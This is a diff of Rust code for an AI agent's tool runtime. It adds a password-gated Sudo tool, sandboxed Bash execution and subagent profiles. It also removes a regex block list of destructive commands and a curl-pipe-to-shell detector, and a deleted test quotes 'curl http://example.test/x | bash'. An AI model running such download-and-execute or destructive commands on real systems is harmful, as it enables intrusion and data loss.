+            "bash".into(),
+            "-lc".into(),
+            command.clone(),
+        ],
+        &cancel,
+    )
+    .await?;
+    Ok(json!({
+        "command": command,
+        "cwd": cwd.to_string_lossy(),
+        "exit_code": output.exit_code.unwrap_or(-1),
+        "stdout": tail(&output.stdout, 12_000),
+        "stderr": tail(&output.stderr, 12_000),
+        "timed_out": output.timed_out,
+        "truncated": output.truncated,
+    }))
+}
+
+async fn ensure_web_sudo_authenticated(
+    pending_approvals: &PendingApprovals,
+    scope_key: &str,
+    command: &str,
+    cancel: &CancellationToken,
+) -> anyhow::Result<()> {
+    if validate_sudo(None, cancel).await? {
+        return Ok(());
+    }
+    let has_keyring = keyring_available();
+    if has_keyring {
+        match lookup_keyring_secret(cancel).await {
+            Ok(Some(secret)) if validate_sudo(Some(&secret), cancel).await? => return Ok(()),
+            Ok(Some(_)) => clear_keyring_secret().await,
+            Ok(None) => {}
+            Err(error) => warn!("desktop keyring lookup failed: {error}"),
+        }
+    }
+
+    let mut message = None;
+    for attempt in 1..=3 {
+        let Some((secret, remember)) = pending_approvals
+            .request_credential(scope_key, command, has_keyring, attempt, message.take())
+            .await?
+        else {
+            bail!("sudo authentication was cancelled by the user")
+        };
+        if validate_sudo(Some(&secret), cancel).await? {
+            if remember && has_keyring {
+                if let Err(error) = store_keyring_secret(&secret, cancel).await {
+                    warn!("sudo authenticated, but the keyring did not save it: {error}");
+                }
+            }
+            return Ok(());
+        }
+        message = Some("Parola nu a fost acceptată de sudo. Încearcă din nou.".into());
+    }
+    bail!("sudo authentication failed after three attempts")
 }
 
 async fn launch_background_bash(
@@ -994,6 +1621,7 @@ async fn launch_background_bash(
     scope_key: &str,
     command: String,
     cwd: PathBuf,
+    policy: SandboxPolicy,
 ) -> anyhow::Result<Value> {
     let summary = short_command(&command, 80);
     let task = tasks::create_runtime_task(
@@ -1031,6 +1659,7 @@ async fn launch_background_bash(
             worker_task_id,
             worker_command,
             worker_cwd,
+            policy,
             cancel_rx,
         )
         .await;
@@ -1053,6 +1682,7 @@ async fn run_background_bash(
     task_id: String,
     command: String,
     cwd: PathBuf,
+    policy: SandboxPolicy,
     mut cancel_rx: oneshot::Receiver<()>,
 ) {
     let _ = tasks::append_task_output_text(
@@ -1066,13 +1696,16 @@ async fn run_background_bash(
         ),
     );
 
-    let mut bash = Command::new("bash");
-    bash.arg("-lc")
-        .arg(&command)
-        .current_dir(&cwd)
-        .stdout(Stdio::piped())
-        .stderr(Stdio::piped());
-    configure_child_process_group(&mut bash);
+    let mut bash = match sandboxed_command(&policy, "bash", &["-lc".into(), command.clone()]) {
+        Ok(command) => command,
+        Err(err) => {
+            let error = format!("Failed to prepare sandboxed Bash command: {err}");
+            let _ = tasks::mark_task_terminal(&paths, &task_id, "failed", None, Some(&error));
+            runtime.remove(&task_id).await;
+            return;
+        }
+    };
+    bash.stdout(Stdio::piped()).stderr(Stdio::piped());
 
     let mut child = match bash.spawn() {
         Ok(child) => child,
@@ -1185,20 +1818,6 @@ async fn join_pipe_reader(reader: Option<tokio::task::JoinHandle<String>>) -> St
     }
 }
 
-fn configure_child_process_group(command: &mut Command) {
-    #[cfg(unix)]
-    {
-        unsafe {
-            command.pre_exec(|| {
-                if libc::setsid() == -1 {
-                    return Err(io::Error::last_os_error());
-                }
-                Ok(())
-            });
-        }
-    }
-}
-
 async fn terminate_child_process_group(child: &mut tokio::process::Child) {
     #[cfg(unix)]
     if let Some(pid) = child.id() {
@@ -1265,6 +1884,10 @@ async fn tool_config(
         .ok_or_else(|| anyhow!("config must serialize to an object"))?;
     updated.insert(setting.clone(), value.clone());
     let mut new_cfg: AppConfig = serde_json::from_value(Value::Object(updated))?;
+    if setting == "llama_api_key" {
+        let provider_id = new_cfg.provider_id.clone();
+        new_cfg.remember_provider_api_key(&provider_id, value.as_str());
+    }
     new_cfg.normalize();
     new_cfg.save(&paths.config_file)?;
     if let Some(config_state) = config_state {
@@ -1506,6 +2129,9 @@ async fn launch_remote_agent(
     description: &str,
     subagent_type: &str,
     model: &str,
+    parent_agent_id: Option<&str>,
+    agent_depth: u32,
+    provider_id: &str,
 ) -> anyhow::Result<Value> {
     let launcher = cfg.remote_agent_api_url.trim().trim_end_matches('/');
     if launcher.is_empty() {
@@ -1520,9 +2146,16 @@ async fn launch_remote_agent(
         prompt,
         "pending",
         json!({
-            "agent_type": if subagent_type.is_empty() { "general-purpose" } else { subagent_type },
+            "agent_type": AgentProfile::from_subagent_type(subagent_type).label(),
+            "requested_agent_type": subagent_type,
+            "provider_id": provider_id,
             "model": model,
             "isolation": "remote",
+            "background": true,
+            "parent_agent_id": parent_agent_id,
+            "agent_depth": agent_depth,
+            "source": source_channel_for_scope(scope_key),
+            "workspace": paths.workspace_dir.to_string_lossy(),
         }),
     )?;
     let task_id = task
@@ -1542,7 +2175,10 @@ async fn launch_remote_agent(
         "description": description,
         "prompt": prompt,
         "model": model,
+        "provider_id": provider_id,
         "subagent_type": subagent_type,
+        "parent_agent_id": parent_agent_id,
+        "agent_depth": agent_depth,
         "callback_url": format!(
             "http://{}:{}/api/runtime/tasks/{}/update?token={}",
             cfg.host, cfg.port, task_id, cfg.web_api_token
@@ -1627,17 +2263,17 @@ async fn launch_remote_agent(
 
 async fn read_json_response(response: reqwest::Response) -> anyhow::Result<Value> {
     let status = response.status();
-    let raw = response.text().await.unwrap_or_default();
+    let response_body = response.text().await.unwrap_or_default();
     if !status.is_success() {
         bail!(
             "HTTP {status}: {}",
-            raw.chars().take(800).collect::<String>()
+            response_body.chars().take(800).collect::<String>()
         );
     }
-    if raw.trim().is_empty() {
+    if response_body.trim().is_empty() {
         Ok(json!({}))
     } else {
-        serde_json::from_str(&raw).context("failed to parse JSON response")
+        serde_json::from_str(&response_body).context("failed to parse JSON response")
     }
 }
 
@@ -1739,6 +2375,7 @@ async fn run_background_agent(
     cfg: AppConfig,
     client: LlamaClient,
     pending_questions: PendingQuestions,
+    pending_approvals: PendingApprovals,
     runtime: RuntimeHandles,
     runtime_profile: RuntimeProfile,
     config_state: Option<Arc<RwLock<AppConfig>>>,
@@ -1748,22 +2385,15 @@ async fn run_background_agent(
     model: String,
     description: String,
     subagent_type: String,
+    agent_profile: AgentProfile,
     agent_depth: u32,
     memory_block: Option<String>,
     mut cancel_rx: oneshot::Receiver<()>,
+    local_web: bool,
 ) {
-    let _ = tasks::append_task_output_text(
-        &paths,
-        &task_id,
-        &format!(
-            "[{}] Agent started: {}\n\n",
-            runtime_timestamp(),
-            description
-        ),
-    );
     let system_prompt = build_agent_system_prompt(&description, &subagent_type);
     let response = tokio::select! {
-        reply = Box::pin(run_tool_loop(
+        reply = Box::pin(run_tool_loop_internal(
             &client,
             &cfg,
             &paths,
@@ -1774,9 +2404,13 @@ async fn run_background_agent(
             &prompt,
             Some(&scope_key),
             &pending_questions,
+            &pending_approvals,
             &runtime,
             config_state.clone(),
             agent_depth,
+            local_web,
+            Some(&task_id),
+            agent_profile,
         )) => Some(reply),
         _ = &mut cancel_rx => None,
     };
@@ -1818,9 +2452,10 @@ fn remote_agent_request(
 fn build_agent_system_prompt(description: &str, subagent_type: &str) -> String {
     let mut parts = vec![
         SYSTEM_PROMPT.trim().to_string(),
-        "You are running as a delegated subagent.".into(),
-        "Your job is to complete the parent's task efficiently and report the result back.".into(),
+        "You are running as a delegated subagent in a fresh, isolated conversation.".into(),
+        "Your job is to complete exactly the parent's task efficiently and report the result back. You share the same working directory, configuration, sandbox policy, and approval channel, but you do not inherit the parent's conversation transcript.".into(),
         "Do not address the human directly unless the task explicitly requires it.".into(),
+        "Do not repeat the assignment or provide progress chatter. Work autonomously with the tools available to your profile. If blocked, return the precise blocker to the parent.".into(),
         "When you finish, return a concise result with concrete findings or outputs.".into(),
     ];
     if !description.trim().is_empty() {
@@ -1848,14 +2483,28 @@ fn openai_tool_schemas() -> Vec<Value> {
     vec![
         tool_schema(
             "Agent",
-            "Delegate work to a local or remote subagent.",
+            "Launch an isolated subagent and return its result. Multiple Agent calls in one response run concurrently, like Claude Code.",
             json!({
                 "type": "object",
                 "properties": {
                     "description": {"type": "string"},
                     "prompt": {"type": "string"},
-                    "subagent_type": {"type": "string"},
-                    "model": {"type": "string"},
+                    "subagent_type": {
+                        "type": "string",
+                        "enum": ["general-purpose", "Explore", "Plan"],
+                        "default": "general-purpose",
+                        "description": "Explore and Plan are read-only; general-purpose may modify the workspace."
+                    },
+                    "provider_id": {
+                        "type": "string",
+                        "default": "inherit",
+                        "description": "Provider preset for this subagent (for example inherit, openai, anthropic, deepseek, openrouter, custom). The provider's saved API key is reused."
+                    },
+                    "model": {
+                        "type": "string",
+                        "default": "inherit",
+                        "description": "Use inherit for the parent's model or provide another model id from the active provider."
+                    },
                     "run_in_background": {"type": "boolean", "default": false},
                     "isolation": {"type": "string", "enum": ["local", "remote"], "default": "local"}
                 },
@@ -1921,8 +2570,7 @@ fn openai_tool_schemas() -> Vec<Value> {
                 "type": "object",
                 "properties": {
                     "path": {"type": "string"},
-                    "max_chars": {"type": "integer", "default": 20000},
-                    "allow_outside_workspace": {"type": "boolean", "default": false}
+                    "max_chars": {"type": "integer", "default": 20000}
                 },
                 "required": ["path"],
                 "additionalProperties": false
@@ -1983,7 +2631,7 @@ fn openai_tool_schemas() -> Vec<Value> {
         ),
         tool_schema(
             "Bash",
-            "Run non-destructive shell commands inside the workspace.",
+            "Run a shell command inside the selected workspace. Normal mode asks the user first; sudo is blocked here.",
             json!({
                 "type": "object",
                 "properties": {
@@ -1991,6 +2639,20 @@ fn openai_tool_schemas() -> Vec<Value> {
                     "cwd": {"type": "string", "default": "."},
                     "timeout": {"type": "integer", "default": 20},
                     "run_in_background": {"type": "boolean", "default": false}
+                },
+                "required": ["command"],
+                "additionalProperties": false
+            }),
+        ),
+        tool_schema(
+            "Sudo",
+            "Run one explicitly approved command as root. The local interface collects the password; the model never sees it.",
+            json!({
+                "type": "object",
+                "properties": {
+                    "command": {"type": "string"},
+                    "cwd": {"type": "string", "default": "."},
+                    "timeout": {"type": "integer", "default": 60}
                 },
                 "required": ["command"],
                 "additionalProperties": false
@@ -2171,8 +2833,8 @@ fn tool_metadata() -> Vec<ToolMeta> {
     vec![
         ToolMeta {
             name: "Agent",
-            description: "Delegate work to a local or remote subagent.",
-            search_hint: "spawn subagent delegate task background worker",
+            description: "Launch an isolated Claude Code-style subagent.",
+            search_hint: "spawn subagent delegate parallel explore plan background worker",
             aliases: &[],
         },
         ToolMeta {
@@ -2219,8 +2881,14 @@ fn tool_metadata() -> Vec<ToolMeta> {
         },
         ToolMeta {
             name: "Bash",
-            description: "Run non-destructive shell commands inside the workspace.",
+            description: "Run an approved shell command inside the selected workspace.",
             search_hint: "run shell command inspect environment terminal command",
+            aliases: &[],
+        },
+        ToolMeta {
+            name: "Sudo",
+            description: "Run one locally approved command as root without exposing the password to the model.",
+            search_hint: "sudo root administrator privileged command package install",
             aliases: &[],
         },
         ToolMeta {
@@ -2317,13 +2985,13 @@ fn resolve_workspace_path(
         bail!("Missing path");
     }
     let base = paths
-        .app_dir
+        .workspace_dir
         .canonicalize()
-        .unwrap_or_else(|_| paths.app_dir.clone());
+        .unwrap_or_else(|_| paths.workspace_dir.clone());
     let joined = if Path::new(raw_path).is_absolute() {
         PathBuf::from(raw_path)
     } else {
-        paths.app_dir.join(raw_path)
+        paths.workspace_dir.join(raw_path)
     };
     let normalized = normalize_path(&joined);
 
@@ -2336,9 +3004,11 @@ fn resolve_workspace_path(
     } else {
         let parent = normalized
             .parent()
-            .unwrap_or(&paths.app_dir)
+            .unwrap_or(&paths.workspace_dir)
             .canonicalize()
-            .unwrap_or_else(|_| normalize_path(normalized.parent().unwrap_or(&paths.app_dir)));
+            .unwrap_or_else(|_| {
+                normalize_path(normalized.parent().unwrap_or(&paths.workspace_dir))
+            });
         parent.join(normalized.file_name().unwrap_or_default())
     };
     if !check_path.starts_with(&base) {
@@ -2440,7 +3110,6 @@ fn config_tool_settings() -> Vec<(&'static str, &'static str)> {
         ("provider_id", "Selected shared provider preset."),
         ("default_model", "Default model used for chat requests."),
         ("llama_base_url", "Base URL for llama-server."),
-        ("llama_api_key", "API key used for llama-server requests."),
         (
             "llama_api_mode",
             "Request style for llama-server (chat or completion).",
@@ -2454,7 +3123,6 @@ fn config_tool_settings() -> Vec<(&'static str, &'static str)> {
             "Maximum output tokens requested from llama-server.",
         ),
         ("firecrawl_api_url", "Base URL for Firecrawl."),
-        ("firecrawl_api_key", "API key used for Firecrawl requests."),
         (
             "web_search_enabled",
             "Enable or disable WebSearch/WebFetch and lazy local Firecrawl startup.",
@@ -2481,12 +3149,12 @@ fn config_tool_settings() -> Vec<(&'static str, &'static str)> {
         ),
         ("agent_max_depth", "Maximum nested Agent tool depth."),
         (
-            "remote_agent_api_url",
-            "Optional launcher URL for remote agents.",
+            "agent_max_concurrent",
+            "Maximum number of subagents that may run concurrently.",
         ),
         (
-            "remote_agent_api_key",
-            "Optional bearer token for the remote agent launcher.",
+            "remote_agent_api_url",
+            "Optional launcher URL for remote agents.",
         ),
         (
             "history_window",
@@ -2596,47 +3264,10 @@ fn validate_bash_command(command: &str) -> anyhow::Result<()> {
     if trimmed.contains('\0') {
         bail!("Bash command contains a NUL byte");
     }
-    if bash_blocklist().is_match(trimmed) {
-        bail!("Blocked potentially destructive bash command");
-    }
     if bash_background_operator().is_match(trimmed) {
         bail!("Shell background operators are blocked; use run_in_background instead");
     }
-    if download_execute_pattern().is_match(trimmed) {
-        bail!("Downloading and executing scripts in one command is blocked");
-    }
     Ok(())
-}
-
-fn bash_blocklist() -> &'static Regex {
-    static BLOCKLIST: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
-        Regex::new(
-            r"(?ix)
-            (^|[;&|()\s])
-            (
-                rm|sudo|su|shutdown|reboot|poweroff|halt|mkfs|fdisk|dd|mount|umount|passwd|
-                chown|useradd|userdel|groupadd|groupdel|visudo|iptables|nft|ufw|systemctl|
-                service|killall|pkill|shred|truncate
-            )\b
-            |
-            (^|[;&|()\s])git\s+clean\b
-            |
-            (^|[;&|()\s])find\b[^\n]*(\s-delete\b)
-            |
-            (^|[;&|()\s])chmod\s+-R\b
-            |
-            (^|[;&|()\s])sed\s+-i\b
-            |
-            (^|[^0-9])>{1,2}
-            |
-            `|\$\(
-            |
-            \b(nohup|disown|setsid|daemonize)\b
-            ",
-        )
-        .unwrap()
-    });
-    &BLOCKLIST
 }
 
 fn bash_background_operator() -> &'static Regex {
@@ -2645,20 +3276,20 @@ fn bash_background_operator() -> &'static Regex {
     &BACKGROUND
 }
 
-fn download_execute_pattern() -> &'static Regex {
-    static DOWNLOAD_EXEC: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
-        Regex::new(r"(?i)\b(curl|wget)\b[^\n|;]*\|\s*(sh|bash|python|python3|node|perl|ruby)\b")
-            .unwrap()
-    });
-    &DOWNLOAD_EXEC
-}
-
 fn normalize_ws(text: &str) -> String {
     Regex::new(r"\s+")
         .unwrap()
         .replace_all(text, " ")
         .trim()
         .to_string()
+}
+
+fn source_channel_for_scope(scope_key: &str) -> &'static str {
+    if scope_key.starts_with("wa_") || scope_key.starts_with("whatsapp_") {
+        "whatsapp"
+    } else {
+        "webtool"
+    }
 }
 
 fn runtime_timestamp() -> String {
@@ -2752,49 +3383,77 @@ mod tests {
         );
     }
 
-    #[tokio::test]
-    async fn background_bash_creates_completed_task_output() {
-        let root =
-            std::env::temp_dir().join(format!("gnomef-rs-bg-test-{}", Uuid::new_v4().simple()));
-        let paths = AppPaths::new(root.clone()).unwrap();
-        let runtime = RuntimeHandles::default();
-        let mut args = Map::new();
-        args.insert("command".into(), json!("printf background-ok"));
-        args.insert("run_in_background".into(), json!(true));
+    #[test]
+    fn web_execution_policy_uses_the_selected_mode_and_workspace() {
+        let mut cfg = AppConfig::default();
+        cfg.web_sandbox_mode = "full-access".into();
+        let workspace = PathBuf::from("/tmp/example-workspace");
+        let policy = web_sandbox_policy(&cfg, workspace.clone(), 42);
+        assert_eq!(policy.mode, SandboxMode::FullAccess);
+        assert_eq!(policy.cwd, workspace);
+        assert_eq!(policy.timeout_ms, 42_000);
+    }
 
-        let launched = tool_bash(&paths, &args, &runtime, "test")
-            .await
-            .expect("background bash should launch");
-        let task_id = launched
-            .get("taskId")
-            .and_then(Value::as_str)
-            .expect("task id")
+    #[test]
+    fn subagent_profiles_enforce_read_only_roles() {
+        assert!(AgentProfile::GeneralPurpose.allows("Edit"));
+        assert!(AgentProfile::GeneralPurpose.allows("Bash"));
+        assert!(!AgentProfile::GeneralPurpose.allows("Config"));
+        assert!(AgentProfile::Explore.allows("Read"));
+        assert!(AgentProfile::Explore.allows("WebSearch"));
+        assert!(!AgentProfile::Explore.allows("Write"));
+        assert!(!AgentProfile::Explore.allows("Bash"));
+        assert!(AgentProfile::Plan.allows("Agent"));
+        assert!(!AgentProfile::Plan.allows("Edit"));
+    }
+
+    #[test]
+    fn every_subagent_can_select_its_own_saved_provider_and_model() {
+        let mut cfg = AppConfig::default();
+        cfg.provider_id = "custom".into();
+        cfg.default_model = "local-parent".into();
+        cfg.remember_provider_api_key("openrouter", Some("sk-openrouter-saved"));
+        cfg.normalize();
+
+        let (agent_cfg, provider, model) = resolve_agent_provider(
+            &cfg,
+            "local-parent",
+            "openrouter",
+            Some("deepseek/deepseek-v4"),
+        )
+        .unwrap();
+        assert_eq!(provider, "openrouter");
+        assert_eq!(model, "deepseek/deepseek-v4");
+        assert_eq!(agent_cfg.provider_id, "openrouter");
+        assert_eq!(agent_cfg.llama_api_key, "sk-openrouter-saved");
+        assert_eq!(agent_cfg.llama_base_url, "https://openrouter.ai/api/v1");
+        assert_eq!(cfg.provider_id, "custom");
+    }
+
+    #[test]
+    fn subagent_provider_without_saved_key_is_rejected() {
+        let cfg = AppConfig::default();
+        let error = resolve_agent_provider(&cfg, &cfg.default_model, "anthropic", None)
+            .unwrap_err()
             .to_string();
+        assert!(error.contains("no saved API key"), "{error}");
+    }
 
-        let deadline = tokio::time::Instant::now() + Duration::from_secs(5);
-        let output = loop {
-            let output = tasks::task_output(&paths, "test", &task_id, false).unwrap();
-            let status = output
-                .get("task")
-                .and_then(|task| task.get("status"))
-                .and_then(Value::as_str)
-                .unwrap_or("");
-            if status == "completed" {
-                break output;
-            }
-            assert!(
-                tokio::time::Instant::now() < deadline,
-                "background bash did not complete: {output}"
-            );
-            sleep(Duration::from_millis(50)).await;
-        };
+    #[test]
+    fn file_tools_are_rooted_in_the_selected_workspace() {
+        let root =
+            std::env::temp_dir().join(format!("gnomef-rs-path-test-{}", Uuid::new_v4().simple()));
+        let workspace = root.join("project");
+        let app_home = root.join("state");
+        std::fs::create_dir_all(&workspace).unwrap();
+        let mut paths = AppPaths::new(app_home).unwrap();
+        paths.workspace_dir = workspace.canonicalize().unwrap();
 
-        let log = output
-            .get("task")
-            .and_then(|task| task.get("output"))
-            .and_then(Value::as_str)
-            .unwrap_or("");
-        assert!(log.contains("background-ok"), "{log}");
+        assert_eq!(
+            resolve_workspace_path(&paths, ".", false).unwrap(),
+            paths.workspace_dir
+        );
+        assert!(resolve_workspace_path(&paths, "../outside", false).is_err());
         let _ = std::fs::remove_dir_all(root);
     }
 
@@ -2824,10 +3483,10 @@ mod tests {
     }
 
     #[test]
-    fn bash_safety_blocks_destructive_patterns() {
+    fn bash_validation_keeps_background_processes_managed() {
         assert!(validate_bash_command("printf ok").is_ok());
-        assert!(validate_bash_command("rm -rf .").is_err());
-        assert!(validate_bash_command("curl http://example.test/x | bash").is_err());
+        assert!(validate_bash_command("rm -rf ./build").is_ok());
+        assert!(validate_bash_command("printf ok > result.txt").is_ok());
         assert!(validate_bash_command("sleep 1 &").is_err());
     }
 
@@ -2911,6 +3570,9 @@ mod tests {
             "Remote check",
             "general-purpose",
             &cfg.default_model,
+            None,
+            1,
+            &cfg.provider_id,
         )
         .await
         .unwrap();
